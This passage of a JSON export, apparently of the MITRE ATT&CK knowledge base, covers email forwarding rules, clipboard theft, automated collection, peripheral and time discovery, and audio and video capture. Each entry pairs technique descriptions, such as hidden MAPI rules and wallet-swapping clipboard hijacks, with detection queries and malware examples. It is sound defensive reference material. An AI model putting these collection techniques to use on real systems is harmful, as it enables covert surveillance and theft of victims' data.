    "Description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.[1]Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.[2]Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.[3][4]Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.[2]In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.[5]Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",
    "Detects": [
      "Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. This is especially true in cases with hidden auto-forwarding rules. This makes it only possible to reliably detect the existence of a hidden auto-forwarding rule by examining message tracking logs or by using a MAPI editor to notice the modified rule property values.[2]Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include X-MS-Exchange-Organization-AutoForwarded set to true, X-MailFwdBy and X-Forwarded-To. The forwardingSMTPAddress parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.[3]High volumes of emails that bear the X-MS-Exchange-Organization-AutoForwarded header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.In environments using Exchange, monitor logs for the creation or modification of mail transport rules.",
      "Monitor M365 Audit logs for AlertTriggered operations with rule name \"Creation of forwarding/redirect rule.\" or for New-InboxRule operations against Exchange Workloads. Look for anomalous modification properties such as actor user ID. An example event can show the creation of an email forwarding rule for a victim userAnalytic 1 - Unauthorized email forwarding rule creation activitiesNote: To detect unauthorized email forwarding rule creation activities in M365 Audit logs.`index=\"m365_audit_logs\" Operation=\"AlertTriggered\" RuleName=\"Creation of forwarding/redirect rule\"| stats count by Actor, TargetUser| where Actor!=\"expected_actor\" AND TargetUser!=\"expected_target_user\"Analytic 2 - Unauthorized email forwarding rule creation activities`index=\"m365_audit_logs\" Operation=\"New-InboxRule\"| stats count by UserId, Parameters.ForwardTo| where UserId!=\"expected_user\" AND Parameters.ForwardTo!=\"expected_forwarding_address\"",
      "On Windows systems, monitor for creation of suspicious inbox rules through the use of theNew-InboxRule,Set-InboxRule,New-TransportRule, andSet-TransportRulePowerShell cmdlets.[13][11]"
    ],
    "Procedure Examples": [
      "Kimsukyhas set auto-forward rules on victim's e-mail accounts.[6]",
      "LAPSUS$has set an Office 365 tenant level mail transport rule to send all mail in and out of the targeted organization to the newly created account.[7]",
      "Silent Librarianhas set up auto forwarding rules on compromised e-mail accounts.[8]",
      "Star Blizzardhas abused email forwarding rules to monitor the activities of a victim, steal information, and maintain persistent access after compromised credentials are reset.[9][10]"
    ]
  },
  "T1115": {
    "Name": "Clipboard Data",
    "Description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications.For example, on Windows adversaries can access clipboard data by usingclip.exeorGet-Clipboard.[1][2][3]Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g.,Transmitted Data Manipulation).[4]macOS and Linux also have commands, such aspbpaste, to grab clipboard contents.[5]",
    "Detects": [
      "Monitor executed commands and arguments to collect data stored in the clipboard from users copying information within or between applications.",
      "Monitor API calls that could collect data stored in the clipboard from users copying information within or between applications."
    ],
    "Procedure Examples": [
      "Agent Teslacan steal data from the victim’s clipboard.[6][7][8][9]",
      "APT38used a Trojan called KEYLIME to collect data from the clipboard.[10]",
      "APT39has used tools capable of stealing contents of the clipboard.[11]",
      "Astarothcollects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries.[12]",
      "Attorhas a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.[13]",
      "Cadelspyhas the ability to steal data from the clipboard.[14]",
      "Catchamassteals data stored in the clipboard.[15]",
      "CHIMNEYSWEEPcan capture content from the clipboard.[16]",
      "Clamblinghas the ability to capture and store clipboard data.[17][18]",
      "CosmicDukecopies and exfiltrates the clipboard contents every 30 seconds.[19]",
      "DarkCometcan steal data from the clipboard.[20]",
      "DarkGatestarts a thread on execution that captures clipboard data and logs it to a predefined log file.[21][22]",
      "DarkTortillacan download a clipboard information stealer module.[23]",
      "Empirecan harvest clipboard data on both Windows and macOS systems.[24]",
      "Explosivehas a function to use the OpenClipboard wrapper.[25]",
      "FlawedAmmyycan collect clipboard data.[26]",
      "Grandoreirocan capture clipboard data from a compromised host.[27]",
      "The executable version ofHelminthhas a module to log clipboard contents.[28]",
      "AJHUHUGITvariant accesses a screenshot saved in the clipboard and converts it to a JPG image.[29]",
      "jRATcan capture clipboard data.[30]",
      "Koadiccan retrieve the current content of the user clipboard.[31]",
      "KONNIhad a feature to steal data from the clipboard.[32]",
      "Machetehijacks the clipboard data by creating an overlapped window that listens to keyboard events.[33][34]",
      "MacSpycan steal clipboard contents.[35]",
      "MarkiRATcan capture clipboard content.[36]",
      "Melcozcan monitor content saved to the clipboard.[37]",
      "Metamorfohas a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's.[38][39]",
      "MgBotcan capture clipboard data.[40][41]",
      "Mispaduhas the ability to capture and replace Bitcoin wallet data in the clipboard on a compromised host.[42]",
      "OilRighas used infostealer tools to copy clipboard data.[43]",
      "DuringOperation Wocao, threat actors collected clipboard data in plaintext.[44]",
      "Remcossteals and modifies data from the clipboard.[45]",
      "Remexicollects text from the clipboard.[46]",
      "ROKRATcan extract clipboard data from a compromised host.[47]",
      "RTMcollects data from the clipboard.[48][49]",
      "RunningRATcontains code to open and copy data from the clipboard.[50]",
      "SILENTTRINITYcan monitor Clipboard text and can useSystem.Windows.Forms.Clipboard.GetText()to collect data from the clipboard.[51]",
      "TajMahalhas the ability to steal data from the clipboard of an infected host.[52]",
      "TinyZBotcontains functionality to collect information from the clipboard.[53]",
      "VERMINcollects data stored in the clipboard.[54]",
      "XLoadercan collect data stored in the victim's clipboard.[55][56]",
      "Zeus Pandacan hook GetClipboardData function to watch for clipboard pastes to collect.[57]"
    ]
  },
  "T1119": {
    "Name": "Automated Collection",
    "Description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of aCommand and Scripting Interpreterto search for and copy information fitting set criteria such as file type, location, or name at specific time intervals.In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.[1]This functionality could also be built into remote access tools.This technique may incorporate use of other techniques such asFile and Directory DiscoveryandLateral Tool Transferto identify and move files, as well asCloud Service DashboardandCloud Storage Object Discoveryto identify resources in cloud environments.",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to collect internal data.",
      "Monitor for unexpected files (e.g., .pdf, .docx, .jpg, etc.) viewed for collecting internal data.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
      "Monitor Azure AD (Entra ID) Sign In logs for suspicious Applications authenticating to the Graph API or other sensitive Resources using User Agents attributed to scripting interpreters such as python or Powershell.Analytic 1 - Suspicious applications, unusual user agents (e.g., python, PowerShell), anomalous IP addresses, and unmanaged devicesindex=\"azure_ad_signin_logs\" Operation=\"UserLogin\"| search UserAgent=\"python\" OR UserAgent=\"PowerShell\"| stats count by ClientIP, UserId, DeviceProperties| where ClientIP!=\"expected_ip\" OR DeviceProperties!=\"expected_properties\""
    ],
    "Procedure Examples": [
      "Agriusused a custom tool,sql.net4.exe, to query SQL databases and then identify and extract personally identifiable information.[2]",
      "AppleSeedhas automatically collected data from USB drives, keystrokes, and screen images before exfiltration.[3]",
      "APT1used a batch script to perform a series of discovery techniques and saves it to a text file.[4]",
      "APT28used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[5]",
      "APT41 DUSTused tools such as SQLULDR2 and PINEGROVE to gather local system and database information.[6]",
      "ArcaneDoorincluded collection of packet capture and system configuration information.[7]",
      "Attorhas automatically collected data about the compromised system.[8]",
      "BADNEWSmonitors USB devices and copies files with certain extensions to a predefined directory.[9]",
      "Bankshotrecursively generates a list of files within a directory and sends them back to the control server.[10]",
      "ccf32can be used to automatically collect files from a compromised host.[11]",
      "Chimerahas used custom DLLs for continuous retrieval of data from memory.[12]",
      "Comnieexecutes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.[13]",
      "Confuciushas used a file stealer to steal documents and images with the following extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, and jpeg.[14]",
      "Crutchcan automatically monitor removable drives in a loop and copy interesting files.[15]",
      "DarkGatesearches for stored credentials associated with cryptocurrency wallets and notifies the command and control server when identified.[16]",
      "Ember Bearengages in mass collection from compromised systems during intrusions.[17]",
      "Empirecan automatically gather the username, domain name, machine name, and other information from a compromised system.[18]",
      "FIN5scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[19]",
      "FIN6has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button.[20][21]",
      "DuringFrankenstein, the threat actors usedEmpireto automatically gather the username, domain name, machine name, and other system information.[18]",
      "FunnyDreamcan monitor files for changes and automatically collect them.[11]",
      "Gamaredon Grouphas deployed scripts on compromised systems that automatically scan for interesting documents.[22]",
      "GoldFinderlogged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node.[23]",
      "HAFNIUMhas used MSGraph to exfiltrate data from email, OneDrive, and SharePoint.[24]",
      "AHelminthVBScript receives a batch script to execute a set of commands in a command prompt.[25]",
      "InvisiMolecan sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file.[26][27]",
      "Ke3changhas performed frequent and scheduled data collection from victim networks.[28]",
      "LightNeuroncan be configured to automatically collect files under a specified directory.[29]",
      "LoFiSecan collect all the files from the working directory every three hours and place them into a password-protected archive for further exfiltration.[30]",
      "Lumma Stealerhas automated collection of various information including cryptocurrency wallet details.[31]",
      "menuPasshas used the Csvde tool to collect Active Directory files and data.[32]",
      "MESSAGETAPchecks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number, IMSI number, or keyword that matched the predefined list, it is saved to a CSV file for later theft by the threat actor.[33]",
      "Metamorfohas automatically collected mouse clicks, continuous screenshots on the machine, and set timers to collect the contents of the clipboard and website browsing.[34]",
      "Micropsiaexecutes an RAR tool to recursively archive files based on a predefined list of file extensions (.xls,.xlsx,.csv,.odt,.doc,.docx,.ppt,.pptx,.pdf,.mdb,.accdb,.accde, *.txt).[35]",
      "Mustang Pandaused custom batch scripts to collect files automatically from a targeted system.[36]",
      "Mythicsupports scripting of file downloads from agents.[37]",
      "NETWIREcan automatically archive collected data.[38]",
      "NPPSPYcollection is automatically recorded to a specified file on the victim machine.[39]",
      "OilRighas used automated collection.[40]",
      "DuringOperation Wocao, threat actors used a script to collect information about the infected system.[41]",
      "OutSteelcan automatically scan for and collect files with specific extensions.[42]",
      "PACEMAKERcan enter a loop to read/proc/entries every 2 seconds in order to read a target application's memory.[43]",
      "Pacucan automatically collect data, such as CloudFormation templates, EC2 user data, AWS Inspector reports, and IAM credential reports.[44]",
      "Patchworkdeveloped a file stealer to search C:\\ and collect files with certain extensions.Patchworkalso executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.[9]",
      "PoetRATused file system monitoring to track modification and enable automatic exfiltration.[45]",
      "PoshC2contains a module for recursively parsing through files and directories to gather valid credit card numbers.[46]",
      "Proxysvcautomatically collects data about the victim and sends it to the control server.[47]",
      "Raccoon Stealercollects files and directories from victim systems based on configuration data downloaded from command and control servers.[48][49][50]",
      "Ramsaycan conduct an initial scan for Microsoft Word documents on the local system, removable media, and connected network drives, before tagging and collecting them. It can continue tagging documents to collect with follow up scans.[51]",
      "RedCurlhas used batch scripts to collect data.[52][53]",
      "ROADToolsautomatically gathers data from Azure AD environments using the Azure Graph API.[54]",
      "Depending on the Linux distribution,RotaJakiroexecutes a set of commands to collect device information and sends the collected information to the C2 server.[55]",
      "Roverautomatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.[56]",
      "RTMmonitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.[57][58]",
      "ShimRatReportergathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators.[59]",
      "Sidewinderhas used tools to automatically collect system and network configuration information.[60]",
      "StrelaStealerattempts to identify and collect mail login data from Thunderbird and Outlook following execution.[61][62][63][64]",
      "StrongPityhas a file searcher component that can automatically collect and archive files based on a predefined list of file extensions.[65]",
      "T9000searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc,.ppt,.xls,.docx,.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.[66]",
      "TajMahalhas the ability to index and compress files into a send queue for exfiltration.[67]",
      "Threat Group-3390ran a command to compile an archive of file types of interest from the victim user's directories.[68]",
      "Tropic Trooperhas collected information automatically using the adversary'sUSBferryattack.[69]",
      "For all non-removable drives on a victim,USBStealerexecutes automated collection of certain files for later exfiltration.[70]",
      "Valakcan download a module to search for and build a report of harvested credential data.[71]",
      "VERMINsaves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .[72]",
      "WindTailcan identify and add files that possess specific file extensions to an array for archiving.[73]",
      "Winter Viverndelivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.[74]",
      "Zebrocyscans the system and automatically collects files with the following extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, and .lhz.[75][76]"
    ]
  },
  "T1120": {
    "Name": "Peripheral Device Discovery",
    "Description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.[1][2]Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to gather information about attached peripheral devices and components connected to a computer system.",
      "Monitor for API calls that may attempt to gather information about attached peripheral devices and components connected to a computer system.",
      "Monitor for newly executed processes that may attempt to gather information about attached peripheral devices and components connected to a computer system."
    ],
    "Procedure Examples": [
      "AcidPourincludes functionality to identify MMC and SD cards connected to the victim device.[3]",
      "ADVSTORESHELLcan list connected devices.[4]",
      "APT28uses a module to receive a notification every time a USB mass storage device is inserted into a victim.[5]",
      "APT37has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices.[6]",
      "Attorhas a plugin that collects information about inserted storage devices, modems, and phone devices.[7]",
      "BackdoorDiplomacyhas used an executable to detect removable media, such as USB flash drives.[8]",
      "BADNEWSchecks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.[9][10]",
      "Bandookcan detect USB devices.[11]",
      "BlackEnergycan gather very specific information about attached USB devices, to include device instance ID and drive geometry.[12]",
      "Cadelspyhas the ability to steal information about printers and the documents sent to printers.[13]",
      "CHIMNEYSWEEPcan monitor for removable drives.[14]",
      "Crimsonhas the ability to discover pluggable/removable drives to extract files from.[15][16]",
      "Crutchcan monitor for removable drives being plugged into the compromised machine.[17]",
      "DarkWatchmancan list signed PnP drivers for smartcard readers.[18]",
      "DustySkycan detect connected USB devices.[19]",
      "Equationhas used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.[20]",
      "Ferociouscan runGET.WORKSPACEin Microsoft Excel to check if a mouse is present.[21]",
      "FlawedAmmyywill attempt to detect if a usable smart card is current inserted into a card reader.[22]",
      "TheFunnyDreamFilepakMonitor component can detect removable drive insertion.[23]",
      "Gamaredon Grouptools have contained an application to check performance of USB flash drives.Gamaredon Grouphas also used malware to scan for removable drives.[24][25]",
      "Heyoka Backdoorcan identify removable media attached to victim's machines.[26]",
      "INC Ransomwarecan identify external USB and hard drives for encryption and printers to print ransom notes.[27]",
      "jRATcan map UPnP ports.[28]",
      "LockBit 2.0has the ability to identify mounted external storage devices.[29]",
      "LockBit 3.0has the ability to discover external storage devices.[30]",
      "Machetedetects the insertion of new devices by listening for the WM_DEVICECHANGE window message.[31]",
      "Mongallcan identify removable media attached to compromised hosts.[26]",
      "MoonWindobtains the number of removable drives from the victim.[32]",
      "NightClubhas the ability to monitor removable drives.[33]",
      "njRATwill attempt to detect if the victim system has a camera during the initial infection.njRATcan also detect any removable drives connected to the system.[34][35]",
      "ObliqueRATcan discover pluggable/removable drives to extract files from.[36]",
      "OilRighas used tools to identify if a mouse is connected to a targeted system.[37]",
      "DuringOperation CuckooBees, the threat actors used thefsutil fsinfo drivescommand as part of their advanced reconnaissance.[38]",
      "DuringOperation Wocao, threat actors discovered removable disks attached to a system.[39]",
      "A module inPrikormkacollects information on available printers and disk drives.[40]",
      "QakBotcan identify peripheral devices on targeted systems.[41]",
      "QuietSievecan identify and search removable drives for specific file name extensions.[42]",
      "Ragnar Lockermay attempt to connect to removable drives and mapped network drives.[43]",
      "Ramsaycan scan for removable media which may contain documents for collection.[44][45]",
      "ROADSWEEPcan identify removable drives attached to the victim's machine.[14]",
      "RTMcan obtain a list of smart card readers attached to the victim.[46][47]",
      "SharpDiscohas dropped a plugin to monitor external drives toC:\\Users\\Public\\It3.exe.[33]",
      "Stuxnetenumerates removable drives for infection.[48]",
      "SVCReadycan check for the number of devices plugged into an infected host.[49]",
      "T9000searches through connected drives for removable storage devices.[50]",
      "TajMahalhas the ability to identify connected Apple devices.[51]",
      "TeamTNThas searched for attached VGA devices using lspci.[52]",
      "Turiancan scan for removable media to collect data.[8]",
      "Turlahas usedfsutil fsinfo drivesto list connected drives.[53]",
      "USBferrycan check for connected USB devices.[54]",
      "USBStealermonitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.[55]",
      "Volt Typhoonhas obtained victim's screen dimension and display device information.[56]",
      "WannaCrycontains a thread that will attempt to scan for new attached drives every few seconds. If one is identified, it will encrypt the files on the attached device.[57]",
      "WastedLockercan enumerate removable drives prior to the encryption process.[58]",
      "Zebrocyenumerates information about connected storage devices.[59]"
    ]
  },
  "T1123": {
    "Name": "Audio Capture",
    "Description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.[1]Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
    "Detects": [
      "Monitor executed commands and arguments for actions that can leverage a computer’s peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.",
      "Monitor for API calls associated with leveraging a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information."
    ],
    "Procedure Examples": [
      "APT37has used an audio capturing utility known as SOUNDWAVE that captures microphone input.[2]",
      "Attor's has a plugin that is capable of recording audio using available input sound devices.[1]",
      "Bandookhas modules that are capable of capturing audio.[3]",
      "Cadelspyhas the ability to record audio from the compromised host.[4]",
      "Cobian RAThas a feature to perform voice recording on the victim’s machine.[5]",
      "Crimsoncan perform audio surveillance using microphones.[6]",
      "DarkCometcan listen in to victims' conversations through the system’s microphone.[7][8]",
      "Derusbiis capable of performing audio captures.[9]",
      "DOGCALLcan capture microphone data from the victim's machine.[10]",
      "EvilGrabhas the capability to capture audio from a victim machine.[11]",
      "Flamecan record audio using any existing hardware recording devices.[12][13]",
      "Imminent Monitorhas a remote microphone monitoring capability.[14][15]",
      "InvisiMolecan record sound using input audio devices.[16][17]",
      "Janicabcaptured audio and sent it out to a C2 server.[18][19]",
      "jRATcan capture microphone recordings.[20]",
      "LightSpyuses Apple's built-in AVFoundation Framework library to capture and manage audio recordings then transform them to JSON blobs for exfiltration.[21]",
      "Machetecaptures audio from the computer’s microphone.[22][23][24]",
      "MacMahas the ability to record audio.[25]",
      "MacSpycan record the sounds from microphones on a computer.[26]",
      "MgBotcan capture input and output audio streams from infected devices.[27][28]",
      "Micropsiacan perform microphone recording.[29]",
      "NanoCorecan capture audio feeds from the system.[30][31]",
      "NightClubcan load a module to leverage the LAME encoder andmciSendStringWto control and capture audio.[32]",
      "PowerSploit'sGet-MicrophoneAudioExfiltration module can record system microphone audio.[33][34]",
      "Pupycan record sound with the microphone.[35]",
      "Remcoscan capture data from the system’s microphone.[36]",
      "Revenge RAThas a plugin for microphone interception.[37][38]",
      "ROKRAThas an audio capture and eavesdropping module.[39]",
      "T9000uses the Skype API to record audio and video calls. It writes encrypted data to%APPDATA%\\Intel\\Skype.[40]",
      "TajMahalhas the ability to capture VoiceIP application audio on an infected host.[41]",
      "VERMINcan perform audio capture.[42]"
    ]
  },
  "T1124": {
    "Name": "System Time Discovery",
    "Description": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows orsystemsetupon macOS.[1][2][3]These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.[4][5]System time information may be gathered in a number of ways, such as withNeton Windows by performingnet time \\hostnameto gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by usingw32tm /tz.[2]In addition, adversaries can discover device uptime through functions such asGetTickCount()to determine how long it has been since the system booted up.[6]On network devices,Network Device CLIcommands such asshow clock detailcan be used to see the current time configuration.[7]On ESXi servers,esxcli system clock getcan be used for the same purpose.In addition, system calls – such astime()– have been used to collect the current time on Linux devices.[8]On macOS systems, adversaries may use commands such assystemsetup -gettimezoneortimeIntervalSinceNowto gather current time zone information or current date and time.[9][10]This information could be useful for performing other techniques, such as executing a file with aScheduled Task/Job[11], or to discover locality information based on time zone to assist in victim targeting (i.e.System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.[12]",
    "Detects": [
      "Monitor executed commands and arguments for actions that may gather the system time and/or time zone from a local or remote system.",
      "Monitor for API calls that may gather the system time and/or time zone from a local or remote system. Remote access tools with built-in features may interact directly with the Windows API to gather information.",
      "Monitor for newly executed processes that may gather the system time and/or time zone from a local or remote system."
    ],
    "Procedure Examples": [
      "Agent Teslacan collect the timestamp from the victim’s machine.[13]",
      "AppleSeedcan pull a timestamp from the victim's machine.[14]",
      "Astarothcollects the timestamp from the infected machine.[15]",
      "AvosLockerhas checked the system time before and after encryption.[16]",
      "Azorultcan collect the time zone information from the system.[17][18]",
      "BADHATCHcan obtain theDATETIMEandUPTIMEfrom a compromised machine.[19]",
      "Bazarcan collect the time on the compromised host.[20][21]",
      "BendyBearhas the ability to determine local time on a compromised host.[22]",
      "BISCUIThas a command to collect the systemUPTIME.[23]",
      "Bisonalcan check the system time set on the infected host.[24]",
      "BLUELIGHTcan collect the local time on a compromised host.[25]",
      "BRONZE BUTLERhas usednet timeto check the local time on a target system.[26]",
      "build_downerhas the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.[27]",
      "DuringC0015, the threat actors used the commandnet view /all timeto gather the local time of a compromised network.[28]",
      "Cannoncan collect the current time zone information from the victim’s machine.[29]",
      "Carbonuses the commandnet time \\127.0.0.1to get information the system’s time.[30]",
      "ccf32can determine the local time on targeted machines.[31]",
      "Chimerahas usedtime /tandnet time \\ip/hostnamefor system time discovery.[32]",
      "Clamblingcan determine the current time.[33]",
      "ComRAThas checked the victim system's date and time to perform tasks during business hours (9 to 5, Monday to Friday).[34]",
      "Confickeruses the current UTC victim system date for domain generation and connects to time servers to determine the current date.[35][36]",
      "Crimsonhas the ability to determine the date and time on a compromised host.[37]",
      "CURIUMdeployed mechanisms to check system time information following strategic website compromise attacks.[38]",
      "DarkGatecreates a log file for capturing keylogging, clipboard, and related data using the victim host's current date for the filename.[39]DarkGatequeries victim system epoch time during execution.[39]DarkGatecaptures system time information as part of automated profiling on initial installation.[40]",
      "Darkhotelmalware can obtain system time from a compromised host.[41]",
      "DarkWatchmancan collect time zone information and systemUPTIME.[42]",
      "DCSrvcan compare the current time on an infected host with a configuration value to determine when to start the encryption process.[43]",
      "DEADWOODwill set a timestamp value to determine when wiping functionality starts. When the timestamp is met on the system, a trigger file is created on the operating system allowing for execution to proceed. If the timestamp is in the past, the wiper will execute immediately.[44]",
      "DRATzaruscan use theGetTickCountandGetSystemTimeAsFileTimeAPI calls to inspect system time.[45]",
      "DUSTTRAPreads the infected system's current time and writes it to a log file during execution.[46]",
      "Egregorcontains functionality to query the local/system time.[47]",
      "Epicuses thenet timecommand  to get the system time from the machine and collect the current date and time zone information.[48]",
      "EvilBunnyhas used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox.[49]",
      "FELIXROOTgathers the time zone information from the victim’s machine.[50]",
      "FunnyDreamcan check system time to help determine when changes were made to specified files.[31]",
      "GoldMaxcan check the current date-time value of the compromised system, comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server.[51][52]",
      "Grandoreirocan determine the time on the victim machine via IPinfo.[53]",
      "GravityRATcan obtain the date and time of a system.[54]",
      "Green Lambertcan collect the date and time from a compromised host.[55][56]",
      "GRIFFONhas used a reconnaissance module that can be used to retrieve the date and time of the system.[57]",
      "Higaisaused a function to gather the current time.[58]",
      "HOPLIGHThas been observed collecting system time from victim machines.[59]",
      "InvisiMolegathers the local system time from the victim’s machine.[60][61]",
      "KEYPLUGcan obtain the current tick count of an infected computer.[62]",
      "A Destover-like implant used byLazarus Groupcan obtain the current system time and send it to the C2 server.[63]",
      "Metamorfouses JavaScript to get the system time.[64]",
      "MoonWindobtains the victim's current time.[65]",
      "Thenet timecommand can be used inNetto determine the local or remote system time.[66]",
      "Nightdoorcan identify the system local time information.[67]",
      "NOKKIcan collect the current timestamp of the victim's machine.[68]",
      "Okrumcan obtain the date and time of the compromised system.[69]",
      "OopsIEchecks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone.[70]",
      "DuringOperation CuckooBees, the threat actors used thenet timecommand as part of their advanced reconnaissance.[71]",
      "DuringOperation Wocao, threat actors used thetimecommand to retrieve the current time of a compromised system.[72]",
      "PipeMoncan send time zone information from a compromised host to C2.[73]",
      "PowerDukehas commands to get the time the machine was built, the time, and the time zone.[74]",
      "As part of the data reconnaissance phase,Proxysvcgrabs the system time to send back to the control server.[63]",
      "QakBotcan identify the system time on a targeted host.[75]",
      "Raccoon Stealergathers victim machine timezone information.[76][77]",
      "RTMcan obtain the victim time zone.[78]",
      "ShadowPadhas collected the current date and time of the victim system.[79]",
      "Shamoonobtains the system time and will only activate if it is greater than a preset date.[80][81]",
      "SHARPSTATShas the ability to identify the current date and time on the compromised host.[82]",
      "ShrinkLockerretrieves a system timestamp that is used in generating an encryption key.[83]",
      "Sidewinderhas used tools to obtain the current system time.[84]",
      "SILENTTRINITYcan collect start time information from a compromised host.[85]",
      "SombRATcan executegetinfoto discover the current time on a compromised host.[86][87]",
      "StoneDrillcan obtain the current date and time of the victim machine.[88]",
      "StrifeWatercan collect the time zone from the victim's machine.[89]",
      "Stuxnetcollects the time and date of a system when it is infected.[90]",
      "SUNBURSTcollected deviceUPTIME.[91][92]",
      "SVCReadycan collect time zone information.[93]",
      "T9000gathers and beacons the system time during installation.[94]",
      "Taidoorcan useGetLocalTimeandGetSystemTimeto collect system time.[95]",
      "TAINTEDSCRIBEcan executeGetLocalTimefor time discovery.[96]",
      "TajMahalhas the ability to determine local time on a compromised host.[97]",
      "The White Companyhas checked the current date on the victim system.[98]",
      "Torismacan collect the current time on a victim machine.[99]",
      "Turlasurveys a system upon check-in to discover the system time by using thenet timecommand.[48]",
      "UPPERCUThas the capability to obtain the time zone information and current timestamp of the victim’s machine.[100]",
      "Volt Typhoonhas obtained the victim's system timezone.[101]",
      "WindTailhas the ability to generate the current date and time.[102]",
      "Zebrocygathers the current time zone and date information from the system.[103][104]",
      "Zeus Pandacollects the current system time (UTC) and sends it back to the C2 server.[105]",
      "ZIRCONIUMhas used a tool to capture the time on a compromised host in order to register it with C2.[106]"
    ]
  },
  "T1125": {
    "Name": "Video Capture",
    "Description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs fromScreen Capturedue to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.[1]",
    "Detects": [
      "Monitor executed commands and arguments that can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information.",
